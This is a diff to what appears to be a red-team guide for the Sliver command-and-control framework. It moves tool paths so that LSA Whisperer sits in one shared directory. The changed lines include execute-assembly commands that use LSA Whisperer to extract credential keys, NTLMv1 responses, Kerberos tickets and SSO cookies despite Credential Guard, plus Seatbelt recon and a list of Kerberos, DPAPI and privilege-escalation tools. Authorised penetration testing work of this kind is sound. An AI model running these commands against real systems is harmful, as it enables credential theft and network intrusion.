@@ -456,11 +456,11 @@ For tools NOT in the armory, use `execute-assembly` with local .exe files from `
 ```
 # LSA Whisperer — works even with Credential Guard enabled
 # Uses LsaCallAuthenticationPackage (never opens LSASS handle)
-execute-assembly --in-process ~/sliver/tools/lsa-whisperer/build/lsa-whisperer.exe credkey
-execute-assembly --in-process ~/sliver/tools/lsa-whisperer/build/lsa-whisperer.exe ntlmv1
-execute-assembly --in-process ~/sliver/tools/lsa-whisperer/build/lsa-whisperer.exe klist
-execute-assembly --in-process ~/sliver/tools/lsa-whisperer/build/lsa-whisperer.exe dump
-execute-assembly --in-process ~/sliver/tools/lsa-whisperer/build/lsa-whisperer.exe ssocookie
+execute-assembly --in-process ~/sliver/tools/sharp-tools/lsa-whisperer.exe credkey
+execute-assembly --in-process ~/sliver/tools/sharp-tools/lsa-whisperer.exe ntlmv1
+execute-assembly --in-process ~/sliver/tools/sharp-tools/lsa-whisperer.exe klist
+execute-assembly --in-process ~/sliver/tools/sharp-tools/lsa-whisperer.exe dump
+execute-assembly --in-process ~/sliver/tools/sharp-tools/lsa-whisperer.exe ssocookie
 
 # Seatbelt — full host recon
 execute-assembly --in-process ~/sliver/tools/sharp-tools/Seatbelt.exe -group=all
@@ -482,17 +482,16 @@ execute-assembly --in-process ~/sliver/tools/sharp-tools/Rubeus.exe triage
 
 ### Tool Paths (after setup.sh)
 
+All execute-assembly tools are in one directory:
+
 ```
-~/sliver/tools/
-├── lsa-whisperer/build/     # LSA Whisperer exe (Credential Guard bypass)
-├── lsawhisper-bof/          # LSA Whisperer BOF variant
-├── No-Consolation/          # In-memory PE loader
-└── sharp-tools/             # Pre-compiled .NET
-    ├── Rubeus.exe
-    ├── Seatbelt.exe
-    ├── SharpUp.exe
-    ├── Certify.exe
-    └── SharpDPAPI.exe
+~/sliver/tools/sharp-tools/
+├── lsa-whisperer.exe    # Credential Guard bypass (EvanMcBroom)
+├── Rubeus.exe           # Kerberos attacks
+├── Seatbelt.exe         # Host recon
+├── SharpUp.exe          # Privesc checks
+├── Certify.exe          # AD CS enumeration
+└── SharpDPAPI.exe       # DPAPI credential blobs
 ```
 
 ---
